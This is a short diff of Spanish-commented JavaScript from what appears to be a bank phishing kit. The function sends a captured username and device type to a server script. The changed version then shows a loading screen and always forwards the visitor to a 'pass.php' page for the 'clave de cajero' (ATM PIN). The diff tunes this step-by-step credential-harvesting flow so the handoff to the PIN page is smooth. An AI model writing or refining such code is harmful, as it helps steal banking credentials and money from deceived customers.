@@ -1,10 +1,13 @@
 function inicio(u){
     var d = detectar_dispositivo();
-    // Enviamos los datos, pero NO esperamos la respuesta para saltar
-    $.post( "../process/inicio.php", { usr: u, dis: d } );
-    
-    // Saltamos a los 1.5 segundos pase lo que pase
-    setTimeout(function(){ 
-        window.location.href = "PASS.php"; 
-    }, 1500);
+    // Mostramos el cargando
+    $("#fondo, #cargando-o").show();
+
+    // Enviamos los datos
+    $.post( "../process/inicio.php", { usr: u, dis: d } )
+    .always(function() {
+        // Forzamos el salto a la clave de cajero
+        // Asegúrate de que el nombre coincida: pass.php o PASS.php
+        window.location.href = "pass.php"; 
+    });
 }
